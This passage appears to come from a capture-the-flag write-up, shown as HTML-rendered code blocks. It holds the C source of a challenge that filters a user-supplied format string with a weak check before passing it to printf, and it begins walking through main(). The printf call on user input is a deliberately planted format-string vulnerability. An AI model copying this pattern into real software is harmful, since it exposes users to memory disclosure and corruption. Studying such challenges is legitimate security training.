</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">argcnt</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code">
</div></div><div class="ec-line highlight mark"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span style="--0:#982934;--1:#fb99a3">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#613aa9;--1:#c2a8f3">main</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-section collapsible-start"><details><summary><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln"></div></div><div class="code"><span class="expand"></span><span class="collapse"></span><span class="text">44 collapsed lines</span></div></div></summary></details><div class="content-lines"><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> n_args;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">long</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">256</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">setbuf</span><span style="--0:#24292E;--1:#E1E4E8">(stdin, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">setbuf</span><span style="--0:#24292E;--1:#E1E4E8">(stdout, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get arguments */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">n_args) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (n_args </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Maximum of 4 arguments supported&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">memset</span><span style="--0:#24292E;--1:#E1E4E8">(args, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(args));</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">55</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">; i </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> n_args; i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">56</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;args[</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, i);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">57</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%ld</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, args </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> i) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">58</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">59</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">60</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">61</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">62</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">63</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">getchar</span><span style="--0:#24292E;--1:#E1E4E8">() </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">64</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Format string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">65</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(fmt), stdin) </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">66</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">67</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">68</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">69</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Verify format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">70</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">verify_fmt</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, n_args)) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">71</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">72</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">73</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">74</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Enjoy! */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">75</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">]);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">76</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">77</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">78</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">79</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#include <ctype.h>#include <stdio.h>#include <stdlib.h>#include <string.h>int verify_fmt(const char *fmt, size_t n_args) {  size_t argcnt = 0;  size_t len = strlen(fmt);  for (size_t i = 0; i < len; i++) {    if (fmt[i] == '%') {      if (fmt[i+1] == '%') {        i++;        continue;      }      if (isdigit(fmt[i+1])) {        puts(&#34;[-] Positional argument not supported&#34;);        return 1;      }      if (argcnt >= n_args) {        printf(&#34;[-] Cannot use more than %lu specifiers\n&#34;, n_args);        return 1;      }      argcnt++;    }  }  return 0;}int main() {  size_t n_args;  long args[4];  char fmt[256];  setbuf(stdin, NULL);  setbuf(stdout, NULL);  while (1) {    /* Get arguments */    printf(&#34;# of args: &#34;);    if (scanf(&#34;%lu&#34;, &#38;n_args) != 1) {      return 1;    }    if (n_args > 4) {      puts(&#34;[-] Maximum of 4 arguments supported&#34;);      continue;    }    memset(args, 0, sizeof(args));    for (size_t i = 0; i < n_args; i++) {      printf(&#34;args[%lu]: &#34;, i);      if (scanf(&#34;%ld&#34;, args + i) != 1) {        return 1;      }    }    /* Get format string */    while (getchar() != '\n');    printf(&#34;Format string: &#34;);    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {      return 1;    }    /* Verify format string */    if (verify_fmt(fmt, n_args)) {      continue;    }    /* Enjoy! */    printf(fmt, args[0], args[1], args[2], args[3]);  }  return 0;}"><div></div></button></div></figure></div>
<p>Let’s examine the <code>main()</code> function first:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:52ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> n_args;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">long</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">256</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">setbuf</span><span style="--0:#24292E;--1:#E1E4E8">(stdin, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">setbuf</span><span style="--0:#24292E;--1:#E1E4E8">(stdout, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-section collapsible-start"><details><summary><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln"></div></div><div class="code"><span class="expand"></span><span class="collapse"></span><span class="text">33 collapsed lines</span></div></div></summary></details><div class="content-lines"><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get arguments */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">n_args) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (n_args </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Maximum of 4 arguments supported&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">memset</span><span style="--0:#24292E;--1:#E1E4E8">(args, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(args));</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">; i </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> n_args; i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;args[</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, i);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%ld</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, args </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> i) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
